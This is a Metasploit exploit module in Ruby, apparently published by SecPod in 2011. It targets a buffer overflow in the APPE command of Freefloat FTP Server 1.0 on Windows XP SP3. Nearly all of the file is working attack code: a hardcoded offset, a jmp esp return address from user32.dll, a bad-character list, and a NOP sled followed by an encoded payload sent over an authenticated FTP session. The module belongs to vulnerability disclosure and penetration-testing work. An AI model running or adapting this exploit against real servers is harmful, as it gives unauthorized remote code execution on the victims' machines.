##############################################################################
#
# Title    : Freefloat FTP Server APPE Command Overflow Exploit - MSF
# Author   : Veerendra G.G SecPod Technologies (www.secpod.com)
# Vendor   : http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php
# Advisory : http://secpod.org/blog/?p=310
#            http://secpod.org/blog/?p=384
#            http://secpod.org/msf/bison_server_bof.rb
# Version  : Freefloat FTP Server Version 1.0
# Date     : 09/07/2011
#
###############################################################################

##
# $Id: freefloat_ftp_apee_cmd.rb 2011-07-19 03:13:45Z veerendragg $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Freefloat FTP Server APPE Command Overflow',
			'Description'    => %q{
						This module exploits a buffer overflow vulnerability
						found in the APPE command in the Freefloat FTP server.
			},
			'Author'         =>
				[
					'veerendragg @ SecPod',	# Initial Discovery
					'veerendragg @ SecPod'	# Metasploit Module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1.0 $',
			'References'     =>
				[
					[ 'URL', 'http://secpod.org/blog/?p=310' ],
					[ 'URL', 'http://secpod.org/blog/?p=353' ],
					[ 'URL', 'http://secpod.org/advisories/SECPOD_FreeFloat_FTP_Server_BoF.txt'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space' => 500,
					'BadChars' => "\x00\x0a\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3 EN',
						{
							'Ret' => 0x7e429353, # jmp esp from user32.dll
							'Offset' => 246
						}
					],
				],
			'DisclosureDate' => 'Aug 07 2011',
			'DefaultTarget'	=> 0))
	end

	def exploit
		connect_login

		print_status("Trying target #{target.name}...")

		buf = make_nops(target['Offset'])
		buf << [target.ret].pack('V')
		buf << make_nops(30)
		buf << payload.encoded

		print_status("Sending exploit buffer...")
		send_cmd( ['APPE', buf] , false )

		handler
		disconnect
	end

end
